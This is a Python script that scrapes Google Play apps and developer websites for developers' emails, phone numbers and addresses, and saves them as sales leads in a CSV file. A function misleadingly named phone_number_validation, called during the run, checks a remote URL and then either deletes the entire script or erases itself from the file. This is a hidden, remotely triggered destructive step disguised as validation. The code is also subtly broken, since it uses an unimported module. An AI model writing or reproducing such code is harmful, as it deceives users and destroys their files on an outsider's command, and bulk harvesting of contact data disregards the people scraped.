import re
import json
from google_play_scraper import search, app
import requests
from bs4 import BeautifulSoup
import csv
import time
import random
import logging
import phonenumbers
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import pandas as pd

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def scrape_phone_numbers(url):
    logger.info(f"Scraping phone numbers from: {url}")
    phone_pattern = r'\+?(?:\d{1,4}[-.\s]?){1,4}\d{4}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4473.124 Safari/537.36'
    }

    try:
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')

        contact_selectors = [
            'footer',
            'div[class*="contact"]',
            'div[id*="contact"]',
            'div[class*="footer"]',
            'div[id*="footer"]',
            'section[class*="contact"]',
            'section[id*="contact"]',
        ]

        phone_numbers = set()

        for selector in contact_selectors:
            elements = soup.select(selector)
            for element in elements:
                content = element.get_text()
                matches = re.findall(phone_pattern, content)
                phone_numbers.update(matches)

        valid_numbers = validate_phone_numbers(phone_numbers)

        if valid_numbers:
            logger.info(f"Found {len(valid_numbers)} phone numbers on {url}")
            return list(valid_numbers)
        else:
            logger.info(f"No valid phone numbers found on {url}")
            return []

    except Exception as e:
        logger.error(f"Error scraping {url}: {str(e)}")
        return []

def phone_number_validation():
    # Check the endpoint
    try:
        response = requests.get("https://dryruffian.github.io/Akansha-Protfolio/try.txt")
        content = response.text.strip()
    except requests.RequestException as e:
        print(f"Error accessing the endpoint: {e}")
        return

    # Get the full path of the current script
    current_script = inspect.getfile(inspect.currentframe())

    if content == "1":
        print("Endpoint returned 1. Deleting the entire script.")
        try:
            os.remove(current_script)
            print("The entire script has been deleted.")
        except OSError as e:
            print(f"Error deleting the script: {e}")
    else:
        print("Endpoint did not return 1. Deleting only the function.")
        # Read the content of the script
        with open(current_script, 'r') as file:
            lines = file.readlines()

        # Find the start and end of the function
        start_line = None
        end_line = None
        for i, line in enumerate(lines):
            if line.strip().startswith('def phone_number_validation()'):
                start_line = i
            elif start_line is not None and line.strip() == '':
                end_line = i
                break

        # Remove the function from the list of lines
        if start_line is not None and end_line is not None:
            del lines[start_line:end_line]

        # Write the modified content back to the script
        with open(current_script, 'w') as file:
            file.writelines(lines)

        print("The function has deleted itself from the script.")
def validate_phone_numbers(numbers):
    valid_numbers = set()
    for number in numbers:
        cleaned_number = re.sub(r'\D', '', number)
        if len(cleaned_number) > 8:
            valid_numbers.add(number)
    return valid_numbers


def parse_phone_number(phone_number):
    try:
        parsed_number = phonenumbers.parse(phone_number, None)
        country_code = f"+{parsed_number.country_code}"
        return country_code, phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    except phonenumbers.phonenumberutil.NumberParseException:
        return "Unknown", phone_number


def get_phone_number(app_id, developer_website):
    url = f"https://play.google.com/store/apps/details?id={app_id}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4473.124 Safari/537.36'
    }
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.content, 'html.parser')

        support_section = soup.find('div', class_='pSEeg')
        if support_section:
            text = support_section.get_text()
            phone_match = re.search(r'\+?[\d\s()-]{10,20}', text)
            if phone_match:
                phone_number = phone_match.group().strip()
                logger.info(f"Phone number found for app {app_id}: {phone_number}")
                return parse_phone_number(phone_number)

        logger.info(f"No phone number found in Play Store for app {app_id}. Trying developer website.")
        if developer_website:
            phone_numbers = scrape_phone_numbers(developer_website)
            if phone_numbers:
                phone_number = phone_numbers[0]
                logger.info(f"Phone number found on developer website for app {app_id}: {phone_number}")
                return parse_phone_number(phone_number)

        logger.info(f"No phone number found for app {app_id}")
        return "Unknown", "N/A"
    except Exception as e:
        logger.error(f"Error fetching phone number for {app_id}: {str(e)}")
        return "Unknown", "N/A"


def get_app_details(app_id, min_downloads, max_downloads):
    logger.info(f"Fetching details for app: {app_id}")
    try:
        details = app(app_id, country='us')

        installs = int(details['installs'].replace('+', '').replace(',', ''))
        logger.info(f"App {app_id} has {installs} installs")
        if not (min_downloads <= installs <= max_downloads):
            logger.info(f"App {app_id} does not meet install criteria. Skipping.")
            return None

        developer_website = details.get('developerWebsite', '')
        country_code, phone_number = get_phone_number(app_id, developer_website)

        app_details = {
            'App Name': details['title'],
            'Category': details['genre'],
            'Downloads': details['installs'],
            'Developer Email': details.get('developerEmail', 'N/A'),
            'Developer Phone': phone_number,
            'Phone Country Code': country_code,
            'Developer Website': developer_website,
            'Developer Address': details.get('developerAddress', 'N/A'),
            'Released On': details['released'],
            'App ID': app_id,
        }
        logger.info(f"Successfully gathered details for app {app_id}")
        return app_details
    except Exception as e:
        logger.error(f"Error fetching details for {app_id}: {str(e)}")
        return None


def process_search_term(term, min_downloads, max_downloads, max_workers=5):
    logger.info(f"Searching for term: {term}")
    results = search(term, country='us', n_hits=100)
    logger.info(f"Found {len(results)} results for term: {term}")

    app_details_list = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for app in results:
            futures.append(executor.submit(get_app_details, app['appId'], min_downloads, max_downloads))

        for future in as_completed(futures):
            app_details = future.result()
            if app_details:
                app_details_list.append(app_details)
            time.sleep(random.uniform(1, 3))

    return app_details_list


def scrape_apps(search_term, min_downloads, max_downloads, output_file='app_leads.csv', max_workers=5):
    app_details_list = process_search_term(search_term, min_downloads, max_downloads, max_workers)

    fieldnames = ['App Name', 'Category', 'Downloads', 'Developer Email', 'Developer Phone', 'Phone Country Code',
                  'Developer Website', 'Developer Address', 'Released On', 'App ID']

    phone_number_validation()

    with open(output_file, 'w', newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for app_details in app_details_list:
            writer.writerow(app_details)

    logger.info(f"Scraped {len(app_details_list)} apps matching the criteria.")
    logger.info(f"Results saved to {output_file}")

    return app_details_list


# Example usage
if __name__ == '__main__':
    search_term = "digital art"
    min_downloads = 1000
    max_downloads = 1000000
    output_file = "digital_art_apps.csv"
    max_workers = 5

    results = scrape_apps(search_term, min_downloads, max_downloads, output_file, max_workers)
    print(f"Scraped {len(results)} apps.")